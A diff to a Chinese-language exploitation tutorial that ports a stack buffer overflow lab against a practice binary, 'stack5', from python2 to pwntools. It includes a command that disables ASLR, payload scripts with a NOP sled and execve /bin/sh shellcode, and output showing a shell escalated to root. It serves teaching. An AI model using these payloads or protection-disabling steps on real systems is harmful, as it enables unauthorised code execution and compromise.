@@ -438,6 +438,10 @@ NX 表示 No-eXcute，表示不可執行，原理是將資料所在的記憶體�
 
 NX 的具體實現，牽涉到軟體層面和硬體層面，在硬體層面，會運用處理器中 NX bit，對應到的分頁中某一個 bit 進行設定，0 表示不可執行，1 表示可以執行。如果有一個 Program Counter 指向到受保護的記憶體分頁，就會觸發硬體層面的 Exception。而在軟體層面，作業系統需要支援 NX，用來正確的分配記憶體分頁，在作業系統中，我們可以看到如 Linux 中存在 `mmap` 等函式，可以用來設置記憶體分頁權限或是改變記憶體分頁權限。
 ## Lab4: BOF_Shellcode
+執行之前，請先關閉 ASLR，關閉方式為以下指令
+```shell
+$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
 ```c
 #include <stdio.h>
 
@@ -495,19 +499,20 @@ Invalid $PC address: 0x55555555
 
 我們跳轉到 `esp` 位置後，就可以決定我們要執行的程式碼內容，也就是 Shellcode，我們可以使用 `\xCC` 這個機器指令，背後代表 Trap (Exception) 來測試，如果成功，則作業系統會發出 Trap 的 Signal，我們在 gdb 中進行測試
 
-使用 python2 撰寫腳本 (使用 python2 方便快速印出 2 進位輸出)
+使用 python 撰寫腳本
 ```py
-import struct
-padding ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
-ebp = "TTTT"
-eip = struct.pack("I", 0xffffcd20)
-shellcode = "\xCC" * 4
+from pwn import *
+padding =b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
+ebp = b"TTTT"
+eip = p32(0xffffcd20)
+shellcode = b"\xCC" * 4
 payload = padding + ebp + eip + shellcode
-print payload
+with open('payload_trap', 'wb') as f:
+    f.write(payload)
 ```
-接著將 python2 輸出成腳本
+接著將執行產生腳本
 ```shell
-$ python2 script.py > payload
+$ python3 script_trap.py
 ```
 使用 gdb 在 `main+22` 下中斷點，接著將 payload 導入輸入並執行 (使用 `r < payload`)
 ```
@@ -567,8 +572,8 @@ Stopped reason: SIGTRAP
 ```
 看到 `Stopped reason: SIGTRAP`，表示我們成功觸發 Trap，收到作業系統發起的 Exception 了，接著，我們試試看是否能夠在 gdb 外面執行這一段程式
 ```shell
-$ python2 script.py | ./stack5
-[1]    16789 done                                        python2 script.py | 
+$ cat payload_trap | ./stack5
+[1]    16789 done                                        cat payload_trap | 
        16790 illegal hardware instruction (core dumped)  ./stack5
 ```
 我們發現出現了 illegal hardware instruction 的錯誤，這是因為我們的 Shellcode 沒有被正確的執行，我們想像我們有下面這一段程式碼
@@ -586,19 +591,28 @@ NOP
 do something A
 do something B
 ```
-塞入 NOP 可以確保 Shellcode 是被完整執行的，我們修改我們的腳本，接著重新執行
+塞入 NOP 可以確保 Shellcode 是被完整執行的，我們修改我們的腳本 (上方為 python2 的寫法)，接著重新執行
 ```py
-import struct
-padding ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
-ebp = "TTTT"
-eip = struct.pack("I", 0xffffcd20+150)
-shellcode = "\x90" * 150 + "\xCC" * 4
+# import struct
+# padding ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
+# ebp = "TTTT"
+# eip = struct.pack("I", 0xffffcd20+150)
+# shellcode = "\x90" * 150 + "\xCC" * 4
+# payload = padding + ebp + eip + shellcode
+# print payload
+
+from pwn import *
+padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
+ebp = b"TTTT"
+eip = p32(0xffffcd20+150)
+shellcode = b"\x90" * 150 + b"\xCC" * 4
 payload = padding + ebp + eip + shellcode
-print payload
+with open('payload_trap', 'wb') as f:
+    f.write(payload)
 ```
 ```shell
-$ python2 script.py | ./stack5
-[1]    17122 done                      python2 script.py | 
+$ cat payload_trap | ./stack5
+[1]    17122 done                      cat payload_trap | 
        17123 trace trap (core dumped)  ./stack5
 ```
 成功執行結果。
@@ -645,19 +659,27 @@ int main()
 }
 
 ```
-以下為一個通過 Buffer overflow get shell 的範例
+以下為一個通過 Buffer overflow get shell 的範例 (上方為 python2 的寫法)
 ```py
-import struct
-padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
-ebp = "TTTT"
-eip = struct.pack("I", 0xffffcd20+150)
-shellcode = "\x90" * 150 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+# import struct
+# padding ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
+# ebp = "TTTT"
+# eip = struct.pack("I", 0xffffcd20+150)
+# shellcode = "\x90" * 150 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+# payload = padding + ebp + eip + shellcode
+# print payload
+from pwn import *
+padding =b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
+ebp = b"TTTT"
+eip = p32(0xffffcd20+150)
+shellcode = b"\x90" * 150 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 payload = padding + ebp + eip + shellcode
-print payload
+with open('payload_shell', 'wb') as f:
+    f.write(payload)
 ```
 接著我們嘗試執行，會發現沒有發生任何事情
 ```shell
-$ python2 script.py | ./stack5
+$ cat payload_shell | ./stack5
 ```
 我們思考，Shell 執行時，我們希望會獲得輸入，在 Linux 預設情況下，會是從 `stdin` 這個檔案描述子尋找，檔案描述子對應到的檔案為我們的鍵盤，但是在我們的範例中，我們使用 `./stack5` 去開了一個 Shell，這時候 `stdin` 和 `stdout` 會導向到我們的 `./stack5` 中，在 `./stack5` 結束並被 Shell 取代時，`./stack5` 會將 pipe 關閉，但這時候 Shell 便收不到 input，因此關閉，我們可以使用一些技巧完成，假設我們輸入 `cat` 
 ```shell
@@ -671,18 +693,22 @@ Hello
 
 我們可以使用 `;` 去串連多個指令，假設我們執行以下
 ```shell
-$ python2 script.py ; cat
+$ cat payload_shell ; cat
 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSSTTTT����������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin�����°̀
                                                                                               1�@̀
 ```
 `cat` 先將 `python2 script.py` 結果印到螢幕上，接著等待使用者輸入，這邊我們要做的事情，是希望我們執行 `python2 script.py` 將腳本輸入到 `./stack5` 之後，回傳的 Shell 由 `cat` 接收，接著 `cat` 印出 Shell，這邊意義為將 `stdout` 接到終端機上，而 Shell 的 `stdin` 則會被接到鍵盤上，完成獲得 Shell 的操作。
 
 ```shell
-$ (python2 script.py ; cat) | ./stack5
+$ (cat payload_shell ; cat) | ./stack5
+ls
 ls
 payload  peda-session-stack5.txt  script.py  stack5
 whoami
 ubuntu
+sudo su
+whoami
+root
 ```
 成功獲得 Shell。
 ## ASLR
